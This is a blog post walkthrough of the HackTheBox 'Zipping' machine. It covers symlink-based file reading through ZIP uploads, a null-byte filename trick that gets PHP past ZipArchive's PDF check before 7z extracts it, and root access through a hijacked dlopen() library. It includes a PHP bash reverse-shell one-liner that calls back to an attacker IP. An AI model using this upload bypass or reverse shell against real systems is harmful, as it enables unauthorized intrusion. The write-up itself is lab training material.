<!DOCTYPE html><html lang="en"mode="dark"><!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Zipping - HackTheBox" />
<meta property="og:locale" content="en" />
<meta name="description" content="Zipping is a nice medium linux box on HackTheBox. It starts with exploiting a descrepancy on how gz (CLI) and ZipArchive (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking it’s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with dlopen()." />
<meta property="og:description" content="Zipping is a nice medium linux box on HackTheBox. It starts with exploiting a descrepancy on how gz (CLI) and ZipArchive (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking it’s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with dlopen()." />
<link rel="canonical" href="https://4g3nt47.github.io/posts/hackthebox/zipping.html" />
<meta property="og:url" content="https://4g3nt47.github.io/posts/hackthebox/zipping.html" />
<meta property="og:site_name" content="4g3nt47" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-10-22T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Zipping - HackTheBox" />
<meta name="twitter:site" content="@UmarAbdoul" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"Zipping is a nice medium linux box on HackTheBox. It starts with exploiting a descrepancy on how gz (CLI) and ZipArchive (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking it’s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with dlopen().","@type":"BlogPosting","url":"https://4g3nt47.github.io/posts/hackthebox/zipping.html","headline":"Zipping - HackTheBox","dateModified":"2023-10-22T00:00:00+01:00","datePublished":"2023-10-22T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/hackthebox/zipping.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>Zipping - HackTheBox | 4g3nt47
  </title><!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
--><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="4g3nt47">
<meta name="application-name" content="4g3nt47">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">
<!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA --><!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css"><!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet"
    href="/assets/css/bootstrap-toc.min.css"><!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css"><!-- JavaScript -->

  <script src="/assets/js/jquery.min.js"></script>

</head>
<body data-spy="scroll" data-target="#toc"><!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto"><img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"></a>
    </div>

    <div class="site-title mt-3">
      <a href="/">4g3nt47</a>
    </div>
    <div class="site-subtitle font-italic">Welcome to my infosec blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs --><li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i><span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i><span>TAGS</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i><span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i><span>ABOUT</span>
      </a>
    </li> <!-- .nav-item --></ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"><a href="https://github.com/4g3nt47" aria-label="github"target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a><a href="https://twitter.com/UmarAbdoul" aria-label="twitter"target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a><a href="javascript:location.href = 'mailto:' + ['aufaruq02','gmail.com'].join('@')" aria-label="email">
        <i class="fas fa-envelope"></i>
      </a><a href="/rss/feed.xml" aria-label="rss">
        <i class="fas fa-rss"></i>
      </a></div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->
<!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb"><span>
            <a href="/">
              Home
            </a>
          </span><span>Zipping - HackTheBox</span></span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">Post</div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>
<div id="main-wrapper">
      <div id="main">

        <div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
  Refactor the HTML structure.
--><!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
--><!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
--><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->

<h1 data-toc-skip>Zipping - HackTheBox</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>By
    <em><a href="https://twitter.com/UmarAbdoul">Umar Abdul</a></em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted<!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeago"
    date="2023-10-22 00:00:00 +0100"data-toggle="tooltip"
      data-placement="bottom"
      title="Sun, Oct 22, 2023, 12:00 AM +0100">Oct 22, 2023</em>
</span>

      <!-- lastmod date --><!-- read time --><!--
  Calculate the post's reading time, and display the word count in tooltip
 --><!-- words per minute  --><!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1074 words">
  <em>5 min</em> read</span>
<!-- page views --></div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>Zipping</strong> is a nice medium linux box on <em>HackTheBox</em>. It starts with exploiting a descrepancy on how <code class="language-plaintext highlighter-rouge">gz</code> (CLI) and <code class="language-plaintext highlighter-rouge">ZipArchive</code> (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking it’s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with <code class="language-plaintext highlighter-rouge">dlopen()</code>.</p>

<p><br /></p>

<h3 id="info">Info<a href="#info" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p><img data-src="/assets/img/Pasted image 20230830162817.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon<a href="#recon" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 26 20:00:45 2023 as: nmap -sC -sV -oN nmap.txt -v 10.129.116.48
Increasing send delay for 10.129.116.48 from 0 to 5 due to 22 out of 73 dropped probes since last increase.
Nmap scan report for 10.129.116.48
Host is up (0.61s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 26 20:01:54 2023 -- 1 IP address (1 host up) scanned in 68.64 seconds
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<h4 id="web">Web<a href="#web" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>Site presented itself as a <em>watch store</em>;</p>

<p><img data-src="/assets/img/Pasted image 20230830163349.png" alt="" data-proofer-ignore></p>

<p>No vhost seems to be in play. The <em>work with us</em> page looks interesting;</p>

<p><img data-src="/assets/img/Pasted image 20230830163559.png" alt="" data-proofer-ignore></p>

<p>Attempting to upload a <code class="language-plaintext highlighter-rouge">.php</code> file inside a ZIP failed;</p>

<p><img data-src="/assets/img/Pasted image 20230830164128.png" alt="" data-proofer-ignore>
<img data-src="/assets/img/Pasted image 20230830164154.png" alt="" data-proofer-ignore></p>

<p>Forging HTTP headers as well as uploading a zip file with a valid PDF file along with a PHP file also failed. At this point one of my <a href="https://www.hackthebox.com/home/users/profile/174366">teammates</a> noticed that we could upload symolic links inside a zip file and achieve LFI that way as the extracted file will point to another file locally on the box;</p>

<p><img data-src="/assets/img/Pasted image 20230830165016.png" alt="" data-proofer-ignore>
<img data-src="/assets/img/Pasted image 20230830165039.png" alt="" data-proofer-ignore>
<img data-src="/assets/img/Pasted image 20230830165205.png" alt="" data-proofer-ignore></p>

<p>It seems we have access as the above user <code class="language-plaintext highlighter-rouge">rektsu</code> as I was able to read the flag by linking to <code class="language-plaintext highlighter-rouge">/home/rektsu/user.txt</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230830165542.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold<a href="#foothold" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>With the LFI firmly established, I started going after application code and configs. Dumping <code class="language-plaintext highlighter-rouge">../../download.php</code>, which is the file that process uploads, showed how the files are processed;</p>

<p><img data-src="/assets/img/Pasted image 20230830170342.png" alt="" data-proofer-ignore></p>

<p>As you can see above, the web app uses <code class="language-plaintext highlighter-rouge">ZiprArchive</code> to run some checks on the binary prior to extraction. The <code class="language-plaintext highlighter-rouge">open()</code> command loads the archive, which will help detect invalid zip files. The script then calls <code class="language-plaintext highlighter-rouge">getNameIndex(0)</code> to obtain the embedded file name of the compressed file. If this ends with <code class="language-plaintext highlighter-rouge">.pdf</code>, the program proceeds to call <code class="language-plaintext highlighter-rouge">7z</code> to extract the archive to the <code class="language-plaintext highlighter-rouge">uploads/&lt;file-hash&gt;/</code> directory.</p>

<p>With the utilities involved now known, I started running some tests locally, hoping to find a discrepancy in how <code class="language-plaintext highlighter-rouge">ZipArchive</code> and <code class="language-plaintext highlighter-rouge">7z</code> work. When you compress a file as zip, the contents of the file is embedded in the archive (usually after compression unless the file is very small). The name of the file is also stored in 2 places: before (<em>local name</em>) and after (<em>central name</em>) the embedded file data. Both <code class="language-plaintext highlighter-rouge">7z</code> and <code class="language-plaintext highlighter-rouge">ZipArchive</code> seems to be only concerned with the <em>central name</em>;</p>

<p><img data-src="/assets/img/Pasted image 20230830171442.png" alt="" data-proofer-ignore></p>

<p>The name highlighted red above is the central name. I started playing with this in a hex editor, and I realized that <code class="language-plaintext highlighter-rouge">7z</code> and <code class="language-plaintext highlighter-rouge">ZipArchive</code> work <strong>very differently</strong> where null bytes are concerned: <em>ZipArchive</em> <strong>DOES NOT</strong> stop reading a central filename when it encounters a null byte in it, it simply replaces it with a whitespace. <em>7z</em> on the other hand simply stops reading the filename when a null byte is encountered. This is interesting because <em>ZipArchive</em> is what the web app uses to validate the file extension of embedded files. So if we are to add a null byte to the central name just after <code class="language-plaintext highlighter-rouge">.php</code> extension but before <code class="language-plaintext highlighter-rouge">.pdf</code>, <em>ZipArchive</em> will read the complete filename and therefore see it as a <code class="language-plaintext highlighter-rouge">.pdf</code> file, while <em>7z</em> will <strong>truncate</strong> it after the null byte, and see it as a <code class="language-plaintext highlighter-rouge">.php</code> file. Since 7z is what handles the actual file extraction, this will lead to a <code class="language-plaintext highlighter-rouge">.php</code> file being created on disk.</p>

<p>To test this, I created a simple PHP payload that invokes a BASH reverse shell, and saved it as <code class="language-plaintext highlighter-rouge">payload.php0.pdf</code> (0 here is just a placeholder for easy patching);</p>

<div class="language-php highlighter-rouge"><div class="code-header"><span label-text="PHP"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.26/4444 0&gt;&amp;1'"</span><span class="p">);</span> <span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I then zipped this file into <code class="language-plaintext highlighter-rouge">payload.zip</code> using;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ zip payload.zip payload.php0.pdf
</pre></td></tr></tbody></table></code></div></div>

<p>Then I opened it in a hex editor and replaced the 0 (<code class="language-plaintext highlighter-rouge">0x30</code>) with a null byte (<code class="language-plaintext highlighter-rouge">0x00</code>);</p>

<p><img data-src="/assets/img/Pasted image 20230830172940.png" alt="" data-proofer-ignore></p>

<p>I then uploaded it to the box and got a link ending with <code class="language-plaintext highlighter-rouge">payload.php .pdf</code>. This won’t exist since this is just the file that <em>ZipArchive</em> thought will be created, but <em>7z</em> truncated it to <code class="language-plaintext highlighter-rouge">payload.php</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230830173355.png" alt="" data-proofer-ignore>
<img data-src="/assets/img/Pasted image 20230830173423.png" alt="" data-proofer-ignore></p>

<p>Changing it to <code class="language-plaintext highlighter-rouge">/payload.php</code> worked, and I got a shell on the box &lt;3</p>

<p><img data-src="/assets/img/Pasted image 20230830173655.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc<a href="#privesc" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">rektsu</code> has sudo permissions on what looks like a custom binary;</p>

<p><img data-src="/assets/img/Pasted image 20230830173906.png" alt="" data-proofer-ignore>
<img data-src="/assets/img/Pasted image 20230830173940.png" alt="" data-proofer-ignore></p>

<p>The binary is asking for some password, which we do not have. So I downloaded it to my box and opened it in <em>IDA</em> for some analysis. The decompiled main function showed the program reading <strong>30</strong> bytes from standard input and passing it to <code class="language-plaintext highlighter-rouge">checkAuth()</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230830174513.png" alt="" data-proofer-ignore></p>

<p>This is likely what’s doing the password check. Looking into it, we can see the correct password in plain text: <code class="language-plaintext highlighter-rouge">St0ckM4nager</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230830174605.png" alt="" data-proofer-ignore>
<img data-src="/assets/img/Pasted image 20230830174759.png" alt="" data-proofer-ignore></p>

<p>Looking further into the code, there seems to be some runtime deobfuscation going on after successful authentication. The decoded data is passed to <code class="language-plaintext highlighter-rouge">dlopen()</code>, which is used to load <em>shared object (.so)</em> files on linux;</p>

<p><img data-src="/assets/img/Pasted image 20230830175328.png" alt="" data-proofer-ignore></p>

<p>Since <code class="language-plaintext highlighter-rouge">dlopen()</code> expects a valid filename, we can be certain the deobfuscation was completed before this call. So a breakpoint here will be perfect. I tried to run the binary locally but was missing the required version of <code class="language-plaintext highlighter-rouge">libc</code>. However,<code class="language-plaintext highlighter-rouge">dlopen()</code> uses a system call, so we can easily pick it up with tools like <code class="language-plaintext highlighter-rouge">strace</code>, which luckily is installed on the box;</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ strace stock
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/Pasted image 20230830175918.png" alt="" data-proofer-ignore></p>

<p>Looks like the binary is loading a <code class="language-plaintext highlighter-rouge">.so</code> file in our own home directory, which promises easy privesc. I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate a <code class="language-plaintext highlighter-rouge">.so</code> meterpreter payload;</p>

<p><img data-src="/assets/img/Pasted image 20230830180413.png" alt="" data-proofer-ignore></p>

<p>I then setup a listener;</p>

<p><img data-src="/assets/img/Pasted image 20230830180607.png" alt="" data-proofer-ignore></p>

<p>Then I downloaded the payload onto the box;</p>

<p><img data-src="/assets/img/Pasted image 20230830180715.png" alt="" data-proofer-ignore></p>

<p>Calling the <code class="language-plaintext highlighter-rouge">stock</code> binary with sudo, I got a session as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230830181033.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary<a href="#summary" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>80</strong> and <strong>22</strong></li>
  <li>Web application provides file upload for .zip files
    <ul>
      <li>Leveraged symolic links to achieve LFI</li>
      <li>Discovered a discrepancy in how <em>ZipArchive</em> and <em>7z</em> works</li>
      <li>Exploit to upload PHP files for RCE</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">rektsu</code>;
    <ul>
      <li>Exploited a runtime library import to gain code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories --><div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/hackthebox/'>hackthebox</a></div><!-- tags --><div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/hacthebox/"
          class="post-tag no-text-decoration" >hacthebox</a><a href="/tags/medium/"
          class="post-tag no-text-decoration" >medium</a><a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a><a href="/tags/web/"
          class="post-tag no-text-decoration" >web</a><a href="/tags/zip/"
          class="post-tag no-text-decoration" >zip</a><a href="/tags/file-upload/"
          class="post-tag no-text-decoration" >file upload</a><a href="/tags/zip-slip/"
          class="post-tag no-text-decoration" >zip slip</a><a href="/tags/dlopen/"
          class="post-tag no-text-decoration" >dlopen</a></div><div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a> by the author.</div><!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Zipping - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/zipping.html" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Zipping - HackTheBox - 4g3nt47&u=https://4g3nt47.github.io/posts/hackthebox/zipping.html" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a><a href="https://telegram.me/share?text=Zipping - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/zipping.html" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a><i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>
</div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

</div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access"><!--<div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/easy/">easy</a></div>
  </div>-->
    </div><!-- BS-toc.js will be loaded at medium priority -->
<script src="/assets/js/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div></div>

</div>

<!-- tail --><div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  --><!-- An random integer that bigger than 0  --><!-- Equals to TAG_SCORE / {max_categories_hierarchy}  --><!-- Fill with the other newlest posts  --><div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4"><div class="card">
        <a href="/posts/hackthebox/jupiter.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
